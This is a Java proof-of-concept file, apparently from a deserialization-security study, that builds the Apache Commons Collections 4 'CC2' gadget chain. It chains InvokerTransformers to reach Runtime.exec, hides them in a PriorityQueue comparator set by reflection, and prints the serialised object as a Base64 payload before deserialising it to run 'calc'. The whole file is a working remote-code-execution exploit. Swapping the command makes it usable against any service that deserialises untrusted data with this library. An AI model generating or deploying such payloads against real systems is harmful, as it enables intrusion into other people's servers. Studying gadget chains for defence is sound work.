package org.example;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.PriorityQueue;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.ComparableComparator;
import org.apache.commons.collections4.comparators.TransformingComparator;

import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

public class CC2Chain {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers =new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };

        Transformer[] test=new Transformer[]{};
        ChainedTransformer chainedTransformer = new ChainedTransformer(test);
        TransformingComparator transformingComparator=new TransformingComparator(chainedTransformer,new ComparableComparator());
        PriorityQueue priorityQueue=new PriorityQueue(1,transformingComparator);
        priorityQueue.add(1);
        priorityQueue.add(2);

        Field field = chainedTransformer.getClass().getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer,transformers);
//base64
        ByteArrayOutputStream buffer=new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream=new ObjectOutputStream(buffer);
        objectOutputStream.writeObject(priorityQueue);
        String data = Base64.getEncoder().encodeToString(buffer.toByteArray());
        System.out.println(data);

        byte[] bytes=Base64.getDecoder().decode(data.getBytes(StandardCharsets.UTF_8));
        ByteArrayInputStream b = new ByteArrayInputStream(bytes);
        ObjectInputStream input = new ObjectInputStream(b);
        input.readObject();

// 写文件
//        //序列化
//        ObjectOutputStream objectOutputStream=new ObjectOutputStream(new FileOutputStream("./cc1.txt"));
//        objectOutputStream.writeObject(o);
//        objectOutputStream.close();
//        //反序列化
//        ObjectInputStream objectInputStream=new ObjectInputStream(new FileInputStream("./cc1.txt"));
//        objectInputStream.readObject();
    }
}